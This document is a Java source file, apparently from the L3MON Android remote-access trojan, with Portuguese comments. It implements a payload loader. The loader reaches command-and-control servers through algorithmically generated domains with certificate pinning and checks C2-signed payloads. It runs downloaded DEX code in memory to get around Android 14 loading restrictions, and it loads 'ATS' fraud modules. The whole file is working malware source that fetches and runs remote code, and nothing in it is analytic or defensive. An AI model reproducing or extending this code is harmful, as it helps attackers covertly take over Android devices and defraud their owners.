package com.etechd.l3mon.loader;

import android.os.Build;
import android.util.Log;
import com.etechd.l3mon.MainService;
import dalvik.system.DexClassLoader;
import dalvik.system.InMemoryDexClassLoader;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.ByteBuffer;
import java.security.KeyFactory;
import java.security.PublicKey;
import java.security.Signature;
import java.security.spec.X509EncodedKeySpec;
import android.util.Base64;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.CertificatePinner;

import com.etechd.l3mon.managers.DGAManager;

public class PayloadLoader {
    private static final String TAG = "L3MON_PayloadLoader";
    private static final ExecutorService executor = Executors.newSingleThreadExecutor();

    // SSL Pinning Configuration (Updated for DGA)
    private static final CertificatePinner certificatePinner = new CertificatePinner.Builder()
            .add(DGAManager.getCurrentDayDomain(), "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=")
            .build();

    private static final OkHttpClient client = new OkHttpClient.Builder()
            .certificatePinner(certificatePinner)
                    .build();

    // Chave pública RSA para verificar a integridade do payload (Exemplo)
    private static final String PUBLIC_KEY_B64 = 
        "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7PV7X+Z..." +
        " (Substitua pela sua chave pública real em produção)";

    public static void loadPayload(String payloadUrl, OnPayloadLoaded callback) {
        executor.execute(() -> {
            try {
                Request request = new Request.Builder()
                        .url(payloadUrl)
                        .build();

                try (Response response = client.newCall(request).execute()) {
                    if (!response.isSuccessful()) {
                        callback.onError("HTTP Error: " + response.code());
                        return;
                    }

                    // Captura a assinatura enviada pelo servidor no Header
                    String signatureB64 = response.header("X-Payload-Signature");
                    byte[] payloadData = response.body().bytes();

                    // Validação de Assinatura Digital
                    if (signatureB64 == null || !verifySignature(payloadData, signatureB64)) {
                        Log.e(TAG, "Assinatura do payload INVÁLIDA! Abortando carregamento.");
                        callback.onError("Invalid Signature");
                        return;
                    }

                    // Carregar payload
                    boolean loaded = loadInMemory(payloadData);
                    if (loaded) {
                        callback.onSuccess();
                    } else {
                        callback.onError("Falha no carregamento");
                    }
                }

            } catch (Exception e) {
                Log.e(TAG, "Erro no carregamento", e);
                callback.onError(e.getMessage());
            }
        });
    }

    /**
     * Verifica se os dados do payload foram assinados pela chave privada do servidor C2
     */
    private static boolean verifySignature(byte[] data, String signatureB64) {
        try {
            byte[] keyBytes = Base64.decode(PUBLIC_KEY_B64, Base64.DEFAULT);
            X509EncodedKeySpec spec = new X509EncodedKeySpec(keyBytes);
            KeyFactory kf = KeyFactory.getInstance("RSA");
            PublicKey publicKey = kf.generatePublic(spec);

            Signature sig = Signature.getInstance("SHA256withRSA");
            sig.initVerify(publicKey);
            sig.update(data);

            byte[] signatureBytes = Base64.decode(signatureB64, Base64.DEFAULT);
            return sig.verify(signatureBytes);
        } catch (Exception e) {
            Log.e(TAG, "Erro na verificação de assinatura: " + e.getMessage());
            return false;
        }
    }

    private static boolean loadInMemory(byte[] data) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
            Log.w(TAG, "InMemory loading not supported on this version (API < 26)");
            return false;
        }
        try {
            // Android 14+ Hardening: O carregamento em memória evita as restrições 
            // de arquivos somente-leitura impostas no Android 14 para DCL.
            
            ByteBuffer buffer = ByteBuffer.allocateDirect(data.length);
            buffer.put(data);
            buffer.flip();

            InMemoryDexClassLoader loader = new InMemoryDexClassLoader(buffer,
                    MainService.getContextOfApplication().getClassLoader());

            // Exemplo de execução: Carrega a classe principal e executa um bootstrap
            // Class<?> payloadClass = loader.loadClass("com.etechd.l3mon.PayloadEntryPoint");
            // payloadClass.getMethod("init").invoke(null);
            
            Log.d(TAG, "Payload carregado com sucesso diretamente da memória (Android 14 Ready)");
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Erro crítico no carregamento em memória: " + e.getMessage());
            return false;
        }
    }

    public static void loadATSModule(String moduleUrl, String className, com.etechd.l3mon.managers.ATSManager atsManager) {
        executor.execute(() -> {
            try {
                URL url = new URL(moduleUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.connect();

                if (conn.getResponseCode() != HttpURLConnection.HTTP_OK) return;

                String signatureB64 = conn.getHeaderField("X-Payload-Signature");
                InputStream is = conn.getInputStream();
                ByteArrayOutputStream os = new ByteArrayOutputStream();
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = is.read(buffer)) != -1) {
                    os.write(buffer, 0, bytesRead);
                }
                byte[] data = os.toByteArray();

                // Validação de Assinatura para Módulos ATS
                if (signatureB64 == null || !verifySignature(data, signatureB64)) {
                    Log.e(TAG, "Assinatura do Módulo ATS INVÁLIDA! Abortando.");
                    return;
                }

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    ByteBuffer byteBuffer = ByteBuffer.allocateDirect(data.length);
                    byteBuffer.put(data);
                    byteBuffer.flip();
                    
                    InMemoryDexClassLoader loader = new InMemoryDexClassLoader(byteBuffer,
                            MainService.getContextOfApplication().getClassLoader());

                    Class<?> moduleClass = loader.loadClass(className);
                    IATSModule module = (IATSModule) moduleClass.getDeclaredConstructor().newInstance();
                    
                    // Ciclo de vida: onLoad
                    module.onLoad();

                    atsManager.addDynamicModule(module);
                    Log.d(TAG, "Módulo ATS validado e carregado: " + module.getModuleName());
                }
            } catch (Exception e) {
                Log.e(TAG, "Erro ao carregar módulo ATS", e);
            }
        });
    }

    public interface OnPayloadLoaded {
        void onSuccess();
        void onError(String error);
    }
}